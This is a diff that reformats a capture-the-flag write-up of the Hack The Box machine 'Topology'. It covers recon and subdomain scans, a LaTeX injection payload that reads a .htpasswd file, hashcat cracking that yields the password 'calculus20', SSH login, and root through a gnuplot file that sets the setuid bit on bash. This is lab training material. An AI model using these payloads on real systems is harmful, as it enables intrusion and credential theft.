@@ -1,10 +1,20 @@
-<img src="./img/congrats.png">
+<div  align="center"> 
+  <div style="display: inline_block"><br>
+    <img align="center" height="250" alt="coding-time" src="./img/congrats.png">
+      </div>
+    
+</br>
 
 # Topology
-
 ### 16/09/2023
 
+# Recon
 Default nmap Scan open ports:
+<br>
+```python 
+nmap -Pn -sV -O 10.10.11.217
+```
+<br>
 
 ```python
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 00:44 EDT
@@ -35,12 +45,16 @@ Nmap done: 1 IP address (1 host up) scanned in 21.79 seconds
 ```
 From the NMAP scan, ports 80 and 22 were discoverable. So I proceeded to go to the website.
 
+# Enumeration
 
-
-#ENUMERATION
+By visiting the site we can see that the domain is topology.htb. 
+<br>
 
 ```python
-ffuf -H "Host: FUZZ.topology.htb" -u "http://topology.htb/" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --fs 6767
+ffuf -H "Host: FUZZ.topology.htb" -u "http://topology.htb/" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --fs 6767 
+```
+
+```python
 
 
         /'___\  /'___\           /'___\       
@@ -70,13 +84,21 @@ ________________________________________________
     * FUZZ: dev
 
 ```
+Found two more subdomains dev , stats 
 
 <img src="./img/hosts.jpg">
 
-<img src="./img/hacktrics.png">
+<br>
+
 I roamed the website to find the link LaTex Equation Generator helpful.
 
+<br>
+
+<img src="./img/hacktrics.png">
+
 Following this, I search an exploit to work on this function. However, it did not give me any credentials so I had to use the subdomain dev.topology.htb. There is a htpasswd which would give the password of the user. To exploit this the command is shown below.
+
+<br>
 
 ```
 $\lstinputlisting{/var/www/dev/.htpasswd}$
@@ -89,7 +111,11 @@ The username is vdaisley. The password when passed to hash-identifier the encryp
 To decrypt it, I used the hashcat tool.
 
 ```python
-hashcat -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
+```
+<br>
+
+```python
 hashcat (v6.2.6) starting
 
 OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
@@ -166,15 +192,31 @@ Hardware.Mon.#1..: Util: 89%
 Started: Sun Sep 17 01:35:36 2023
 Stopped: Sun Sep 17 01:36:57 2023
 ```
+<br>
 When decrypted, the password is calculus20
-
+After cracking that hash you can log in as vdaisley using ssh 
+<br>
 <img src="./img/ssh.png">
 To get the user flag just navigate directories and cat out the user.txt
+<br>
+
+# Priv-Esc
+<br>
+Priv esc is pretty interesting!
+
+<br>
 
 To obtain root status we must find exploit pspy86. Gnuplot uses plt files.
-<img src="./img/psy.png">
 From uploading the file using wget, I managed to make it executable and so I was able to run it.
+<br>
+
+<img src="./img/psy.png">
+
+The following command made a plt file inside a directory and with the statement system chmod u+s. Bash -p ran the command and made me root. 
+
+<br>
+
 <img src="./img/root.png">
-The following command made a plt file inside a directory and with the statement system chmod u+s. Bash -p ran the command and made me root. From there I was able to switch directories and was able to cat out the root.txt
+From there I was able to switch directories and was able to cat out the root.txt
 
 
